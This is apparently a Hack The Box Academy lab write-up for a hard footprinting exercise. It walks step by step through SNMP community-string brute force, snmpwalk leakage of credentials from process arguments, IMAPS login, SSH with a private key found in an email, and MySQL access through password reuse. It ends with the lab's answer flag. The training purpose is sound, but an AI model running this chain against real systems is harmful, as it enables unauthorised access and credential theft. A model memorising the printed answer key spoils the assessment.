# LAB — Footprinting (Hard)

## ID
604

## Module
Footprinting

## Kind
lab

## Title
Section 21 — Footprinting Lab · Hard

## Description
SNMP community brute (`backup`) → snmpwalk leaks `tom:NMds732Js2761` from `/opt/tom-recovery.sh` errors → IMAP login as `tom` → email body contains an OpenSSH private key → SSH as `tom` → MySQL with same creds → `SELECT * FROM users WHERE username='HTB'`.

## Tags
htb, lab, footprinting, snmp, onesixtyone, snmpwalk, imap, ssh, id_rsa, mysql, hard, password-reuse

## Commands
- `sudo nmap -sU -sV -sC -p U:161,22,110,143,993,995 <IP>`
- `onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp-onesixtyone.txt <IP>`
- `snmpwalk -v2c -c backup <IP>` — leaks creds in process arguments
- `openssl s_client -connect <IP>:imaps`
- IMAP commands: `1337 login tom NMds732Js2761`, `1337 list "" *`, `1337 select "INBOX"`, `1337 fetch 1 (body[])`
- Save key, `chmod 600 id_rsa`, `ssh -i id_rsa tom@<IP>`
- `mysql -u tom -pNMds732Js2761`
- `use users; SELECT * FROM users WHERE username='HTB';`

## Scenario Recap
- MX + management server, also a backup for internal AD accounts.
- Goal: find the password for user `HTB`.

## Walkthrough — Step by Step

### 1. UDP-Focused Nmap
The hostname hints at "MX + management" — check both UDP **and** TCP-with-mail-ports:
```bash
sudo nmap -sU -sV -sC -p U:161,22,110,143,993,995 <IP>
```
- UDP/161 — SNMPv3
- TCP/22, 110, 143, 993, 995 — SSH + IMAP + POP3 (closed in this scan since `-sU` was specified for these ports — re-scan with TCP for full picture).

### 2. Brute the SNMP Community
```bash
onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp-onesixtyone.txt <IP>
# 10.x.x.x [backup] Linux NIXHARD ...
```
Community string = **`backup`**.

### 3. snmpwalk — Find Creds in Process Args
```bash
snmpwalk -v2c -c backup <IP>
```
The `hrSWRunPerf` table exposes running processes and their **command-line arguments**. A `chpasswd`-related script is running with credentials in argv:
```
iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80 = STRING: "/opt/tom-recovery.sh"
iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom NMds732Js2761"
```
**Creds:** `tom:NMds732Js2761`.

### 4. Login over IMAPS
```bash
openssl s_client -connect <IP>:imaps
```
Then:
```
1337 login tom NMds732Js2761
1337 list "" *
1337 select "INBOX"
1337 fetch 1 (body[])
```
The single email contains an SMTP transcript with the subject `KEY` and an embedded **OpenSSH private key** for user `tom`.

### 5. Save Key, SSH In
Copy the `-----BEGIN OPENSSH PRIVATE KEY-----` ... `-----END OPENSSH PRIVATE KEY-----` block to a file `id_rsa`:
```bash
chmod 600 id_rsa
ssh -i id_rsa tom@<IP>
```

### 6. MySQL with Same Password
```bash
mysql -u tom -pNMds732Js2761
mysql> use users;
mysql> SELECT * FROM users WHERE username='HTB';
```
Returns:
```
+-----+----------+------------------------------+
| id  | username | password                     |
+-----+----------+------------------------------+
| 150 | HTB      | cr3n4o7rzse7rzhnckhssncif7ds |
+-----+----------+------------------------------+
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Password for user `HTB` | **`cr3n4o7rzse7rzhnckhssncif7ds`** | SNMP community brute → `snmpwalk` reveals `tom:NMds732Js2761` in process args → IMAPS login as `tom` → SSH key from email → SSH in → MySQL with same creds → `SELECT * FROM users WHERE username='HTB'` |

## Key Takeaways
- **Process-args via SNMP is the disclosure path** — `hrSWRunPerf` (`.1.3.6.1.2.1.25.1.7.1.x`) is gold when admins run `chpasswd <user> <pass>` style scripts. Anything in argv leaks.
- **An IMAP `FETCH 1 (BODY[])` can carry whole SSH private keys** — never dismiss "an email server" as low value.
- **One password, four uses** in this box: SNMP-leaked → IMAP login → (private key in mail body) → MySQL. Always test recycling.
- The walkthrough's tag prefix in IMAP commands (`1337` here, vs `tag0`/`tag1` in §11) is arbitrary — IMAP only requires that the prefix is **unique within the session**.

## Gotchas
- `-sU` Nmap is slow — when you suspect SNMP, scan UDP/161 explicitly rather than waiting for a full UDP scan.
- onesixtyone needs SecLists' `snmp-onesixtyone.txt` (not the `snmp.txt` used in §12) for this lab — different format/order. Both work, but the cleanly-formatted one is faster.
- The OpenSSH key is wrapped inside an SMTP transcript inside an IMAP `FETCH` response — strip the SMTP/MIME junk before saving as `id_rsa`. Keep only `BEGIN ... END PRIVATE KEY` block (inclusive).
- The MySQL flag is in a `users` database with `username` = `HTB` (not `htb`, not `Htb`) — case matters in MySQL `WHERE` comparisons depending on the column's collation.
- `chpasswd: ... pam_chauthtok() failed` errors in the SNMP walk = the recovery script ran, failed to change `tom`'s password, and *logged the attempted password to the SNMP table*. That's the disclosure.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|footprinting]]
← [[20-lab-medium]]
<!-- AUTO-LINKS-END -->
